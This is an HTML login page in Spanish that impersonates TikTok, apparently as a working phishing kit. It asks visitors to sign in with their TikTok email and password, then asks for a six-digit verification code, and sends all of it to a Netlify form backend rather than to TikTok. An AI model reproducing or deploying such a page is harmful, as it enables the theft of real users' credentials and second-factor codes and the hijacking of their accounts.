<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<link rel="stylesheet" href="css/style.css" />
  
<style>
body {
  margin: 0 !important;
  min-height: 100vh !important;
  background-image: url("images/fondo.jpg") !important;
  background-size: cover !important;
  background-position: center !important;
  background-repeat: no-repeat !important;
  background-attachment: fixed !important;
  background-color: transparent !important;
}
</style>

</head>
<body>

  <button class="open-btn" id="openBtn">Iniciar sesión</button>
<button class="close-btn" id="closeBtn" aria-label="Cerrar">✕</button>
      <h2>invitacion de tik tok, registrate primero</h2>
  <div class="overlay" id="overlay">
    <div class="modal">
      <button class="close-btn" id="closeBtn" aria-label="Cerrar">✕</button>
      <h2>inicia sesion con tu cuenta de tik tok</h2>
      <form id="loginForm" name="login" method="POST" data-netlify="true">
        <input type="hidden" name="form-name" value="login" />
        <input type="hidden" name="etapa" value="" />

        <div class="step" id="step1">
          <div class="field">
            <label for="email">Correo</label>
            <input type="email" id="email" name="email" required placeholder="tu@correo.com" />
          </div>
          <div class="field">
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" required placeholder="••••••••" />
          </div>
          <button type="button" class="submit-btn" id="continueBtn">Continuar</button>
        </div>

        <div class="step" id="step2" hidden>
          <div class="field">
            <label for="code">Código de verificación (6 dígitos)</label>
            <input
              type="text"
              id="code"
              name="code"
              inputmode="numeric"
              pattern="[0-9]{6}"
              maxlength="6"
              placeholder="000000"
            />
          </div>
          <button type="button" class="link-btn" id="backBtn">← Volver</button>
          <button type="submit" class="submit-btn" id="submitBtn" disabled>Entrar</button>
        </div>
      </form>
    </div>
  </div>

  <script src="js/script.js"></script>
</body>
</html>
